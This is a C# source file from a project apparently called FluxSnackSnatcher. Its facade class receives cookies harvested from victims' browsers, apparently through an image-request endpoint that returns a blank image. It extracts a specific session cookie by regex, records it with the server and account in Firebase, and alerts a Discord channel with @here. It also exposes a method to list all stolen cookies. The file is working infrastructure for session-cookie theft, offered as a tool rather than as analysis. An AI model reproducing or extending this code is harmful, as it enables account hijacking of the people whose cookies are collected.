using FluxSnackSnatcher.Models;
using FluxSnackSnatcher.Services;
using System.Text.RegularExpressions;

namespace FluxSnackSnatcher.Facades
{
    public class SnatcherFacade : ISnatcherFacade
    {
        private readonly IFirebaseService _firebaseService;
        private readonly IDiscordService _discordService;

        public SnatcherFacade(IFirebaseService firebaseService, IDiscordService discordService)
        {
            _firebaseService = firebaseService;
            _discordService = discordService;
        }

        public async Task<string> SnatchSnack(string? snacks, string? url, string? account)
        {
            try
            {
                var unescapedUrl = Uri.UnescapeDataString(url);

                var sections = unescapedUrl.Split("/");

                url = sections[2];

                var unescapedSnacks = Uri.UnescapeDataString(snacks);

                Console.WriteLine($"Snatching snacks from {url}");

                if (!string.IsNullOrEmpty(snacks))
                {
                    var match = Regex.Match(snacks, Constants.FLUX_COOKIE_REGEX);

                    if (match.Success)
                    {
                        var cookie = new CookieData
                        {
                            ServerUrl = url,
                            Name = Constants.FLUX_COOKIE_NAME,
                            Account = account ?? "guest",
                            Value = match.Groups[1].Value,
                            AddedAt = DateTime.Now.AddHours(-3).ToString()
                        };

                        var response = await _firebaseService.SetCookie(cookie);

                        Console.WriteLine(response);

                        await _discordService.SendMessage($"```{response}```\n@here");
                    }
                }

                return Constants.NO_IMAGE;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);

                return Constants.NO_IMAGE;
            }
        }

        public async Task<IDictionary<string, IList<CookieData>>> GetCookies()
        {
            var snacks = await _firebaseService.GetCookies();

            return snacks;
        }
    }
}
